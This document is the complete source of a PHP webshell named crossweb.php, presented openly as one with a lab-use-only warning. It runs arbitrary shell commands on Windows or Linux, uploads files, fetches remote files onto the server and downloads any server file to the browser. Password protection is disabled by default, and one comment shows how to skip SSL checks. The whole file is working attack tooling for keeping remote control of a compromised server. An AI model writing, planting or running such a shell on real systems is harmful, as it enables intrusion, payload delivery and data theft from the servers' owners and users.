<?php
/****************************************************************************
 * crossweb.php
 *
 * Cross-Platform PHP Webshell with Optional Password Protection
 *
 * Features:
 *   1) Auto-detect Windows vs Linux
 *   2) Execute commands (cmd.exe on Windows, /bin/bash on Linux)
 *   3) Upload files to the server
 *   4) Fetch remote files (HTTP/HTTPS -> server)
 *   5) Download local files (server -> client)
 *   6) Optional password protection (session-based)
 *
 * SECURITY NOTE:
 *   This script is dangerous. Do NOT expose publicly!
 *   Use only in a closed-lab or authorized testing environment.
 ****************************************************************************/

// ------------------ Optional Password ------------------
// Set this to a non-empty string (e.g. "MyS3cr3t") to enable password protection.
// Leave it empty ("") if you do NOT want any password at all.
define('SHELL_PASS', '');
// -------------------------------------------------------

session_start();

// If a password is set, prompt user to enter it before accessing anything.
if (SHELL_PASS !== '') {
    // Check if user is already authenticated
    if (empty($_SESSION['CrossShellAuth']) || $_SESSION['CrossShellAuth'] !== true) {
        // Check if user just submitted the password
        if (isset($_POST['passwordAttempt']) && $_POST['passwordAttempt'] === SHELL_PASS) {
            $_SESSION['CrossShellAuth'] = true;
        } else {
            // Show password form and stop
            showPasswordForm();
            exit;
        }
    }
}

// Detect if OS is Windows or Linux
$IS_WINDOWS = (DIRECTORY_SEPARATOR === '\\');

/**
 * Renders a simple password form and exits.
 */
function showPasswordForm() {
    echo <<<HTML
<html>
<head><title>Password Required</title></head>
<body style="font-family:monospace; margin:2em;">
    <h2>Enter Password</h2>
    <form method="post">
        <label>Password:
            <input type="password" name="passwordAttempt"/>
        </label>
        <input type="submit" value="Submit" />
    </form>
</body>
</html>
HTML;
}

/**
 * Execute a command using cmd.exe (Windows) or /bin/bash (Linux).
 * Returns the output as a string.
 */
function executeCommand($command, $workingDir) {
    global $IS_WINDOWS;
    // If working dir is invalid or not provided, default to current script dir.
    if (empty($workingDir) || !is_dir($workingDir)) {
        $workingDir = __DIR__;
    }

    // Prepare the command
    if ($IS_WINDOWS) {
        // Windows uses cmd.exe /C
        $cmd = 'cmd.exe /C ' . $command;
    } else {
        // Linux: use /bin/bash -c (stderr -> stdout)
        $escaped = str_replace('"', '\\"', $command);
        $cmd = '/bin/bash -c "exec 2>&1; ' . $escaped . '"';
    }

    // Change to working directory
    $currentDir = getcwd();
    chdir($workingDir);

    // Execute and capture output
    $output = shell_exec($cmd);
    if ($output === null) {
        // shell_exec returns null if the command fails or no output
        $output = "Error: Failed to execute command or no output returned.";
    }

    // Revert directory
    chdir($currentDir);

    // HTML-encode
    return htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE);
}

/**
 * Fetch a remote file (HTTP/HTTPS) and save it to $targetPath on the server.
 * Returns status message (HTML-encoded).
 */
function fetchRemote($url, $targetPath) {
    // We'll use cURL for reliability
    $ch = curl_init($url);
    if (!$ch) {
        return "Error initializing cURL for $url";
    }

    $fp = @fopen($targetPath, 'wb');
    if (!$fp) {
        return "Error creating/overwriting file: $targetPath";
    }

    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // Uncomment if you need to bypass SSL validation:
    // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $ok = curl_exec($ch);
    $err = curl_error($ch);

    curl_close($ch);
    fclose($fp);

    if ($ok === false) {
        return "Error fetching $url: $err";
    }

    $size = filesize($targetPath);
    if ($size === false) {
        $size = 0;
    }
    return "Fetched $url → " . htmlspecialchars($targetPath) . " ($size bytes)";
}

/**
 * Sends a file from the server to the client browser (download).
 */
function downloadLocalFile($path) {
    // Check if file exists
    if (!file_exists($path)) {
        echo "<pre>File not found: " . htmlspecialchars($path) . "</pre>";
        return;
    }

    $filename = basename($path);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header("Content-Disposition: attachment; filename=\"$filename\"");
    header('Content-Transfer-Encoding: binary');
    header('Content-Length: ' . filesize($path));

    ob_clean();
    flush();
    readfile($path);
    exit;
}

// -------------------------------------------------------------------------
// Handle Form Submissions
// -------------------------------------------------------------------------
$outputMsg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1) Command Execution
    if (isset($_POST['doExec'])) {
        $cmd = $_POST['txtArg'] ?? '';
        $cwd = $_POST['txtCWD'] ?? '';
        $result = executeCommand($cmd, $cwd);
        $outputMsg .= "<pre>$result</pre>";
    }

    // 2) File Upload
    if (isset($_POST['doUpload']) && isset($_FILES['uploadFile'])) {
        $cwd = $_POST['txtCWD'] ?? '';
        if (empty($cwd) || !is_dir($cwd)) {
            $cwd = __DIR__;
        }

        $tmpName = $_FILES['uploadFile']['tmp_name'];
        $origName = $_FILES['uploadFile']['name'];
        $size = $_FILES['uploadFile']['size'];

        if (is_uploaded_file($tmpName)) {
            $destPath = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($origName);
            if (move_uploaded_file($tmpName, $destPath)) {
                $outputMsg .= "<pre>Uploaded: "
                              . htmlspecialchars($destPath)
                              . " ($size bytes)</pre>";
            } else {
                $outputMsg .= "<pre>Error uploading file to: "
                              . htmlspecialchars($destPath) . "</pre>";
            }
        }
    }

    // 3) Fetch Remote File
    if (isset($_POST['doFetch'])) {
        $url = $_POST['txtFetchURL'] ?? '';
        $cwd = $_POST['txtCWD'] ?? '';
        if (empty($cwd) || !is_dir($cwd)) {
            $cwd = __DIR__;
        }

        if (!empty($url)) {
            $filename = basename(parse_url($url, PHP_URL_PATH));
            if (!$filename) {
                $filename = 'fetched_' . time();
            }
            $targetPath = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;

            $status = fetchRemote($url, $targetPath);
            $outputMsg .= "<pre>" . htmlspecialchars($status) . "</pre>";
        } else {
            $outputMsg .= "<pre>No remote URL provided.</pre>";
        }
    }

    // 4) Download Local File
    if (isset($_POST['doDownload'])) {
        $requestedPath = $_POST['txtDownloadPath'] ?? '';
        $cwd = $_POST['txtCWD'] ?? '';

        if (empty($cwd) || !is_dir($cwd)) {
            $cwd = __DIR__;
        }

        if (!empty($requestedPath)) {
            global $IS_WINDOWS;
            $isAbsolute = false;
            if ($IS_WINDOWS) {
                // Rough check for something like C:\ or \
                $isAbsolute = (preg_match('/^[a-zA-Z]:\\\\|^\\\\/', $requestedPath) === 1);
            } else {
                // On Linux, absolute if it starts with '/'
                $isAbsolute = (substr($requestedPath, 0, 1) === '/');
            }

            $fullPath = $requestedPath;
            if (!$isAbsolute) {
                $fullPath = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $requestedPath;
            }

            downloadLocalFile($fullPath);
        } else {
            $outputMsg .= "<pre>No local file path provided.</pre>";
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Cross-Platform PHP WebShell</title>
    <!--
        WARNING: This page can execute arbitrary commands on your server
        and perform file operations. DO NOT expose publicly.
        Use only in a secure test/lab environment.
    -->
    <style>body{font-family:monospace; margin:2em;}</style>
</head>
<body>

<?php if (SHELL_PASS !== ''): ?>
    <p><em>Password protection is <strong>enabled</strong>.</em></p>
<?php else: ?>
    <p><em>Password protection is <strong>disabled</strong>.</em></p>
<?php endif; ?>

<!-- 
    NOTE: We moved the $outputMsg display BELOW the form to ensure
    that any command or file operation results appear AFTER the form.
-->

<form method="post" enctype="multipart/form-data">
    <h2>Cross-Platform PHP WebShell</h2>

    <!-- Working Directory -->
    <label><strong>CWD:</strong></label><br/>
    <input type="text" name="txtCWD" size="80"
           value="<?php echo isset($_POST['txtCWD'])
               ? htmlspecialchars($_POST['txtCWD'], ENT_QUOTES)
               : htmlspecialchars(__DIR__, ENT_QUOTES); ?>" />
    <br/><br/>

    <!-- Command Execution -->
    <label><strong>Command:</strong></label><br/>
    <input type="text" name="txtArg" size="80"
           value="<?php echo isset($_POST['txtArg'])
               ? htmlspecialchars($_POST['txtArg'], ENT_QUOTES) : ''; ?>" />
    <button type="submit" name="doExec">Execute</button>
    <br/><br/>

    <!-- File Upload -->
    <label><strong>Upload a File (local -> server):</strong></label><br/>
    <input type="file" name="uploadFile"/>
    <button type="submit" name="doUpload">Upload</button>
    <br/><br/>

    <!-- Fetch Remote -->
    <label><strong>Fetch Remote File (HTTP/HTTPS -> server):</strong></label><br/>
    <input type="text" name="txtFetchURL" size="80"
           placeholder="http://example.com/file.zip"
           value="<?php echo isset($_POST['txtFetchURL'])
               ? htmlspecialchars($_POST['txtFetchURL'], ENT_QUOTES) : ''; ?>" />
    <button type="submit" name="doFetch">Fetch</button>
    <br/><br/>

    <!-- Download Local -->
    <label><strong>Download local file (server -> your browser):</strong></label><br/>
    <input type="text" name="txtDownloadPath" size="80"
           placeholder="C:\temp\secret.txt or /home/user/file.txt"
           value="<?php echo isset($_POST['txtDownloadPath'])
               ? htmlspecialchars($_POST['txtDownloadPath'], ENT_QUOTES) : ''; ?>" />
    <button type="submit" name="doDownload">Download</button>
    <br/><br/>
</form>

<!-- Display all operation results BELOW the form -->
<?php
if (!empty($outputMsg)) {
    echo $outputMsg;
}
?>

</body>
</html>
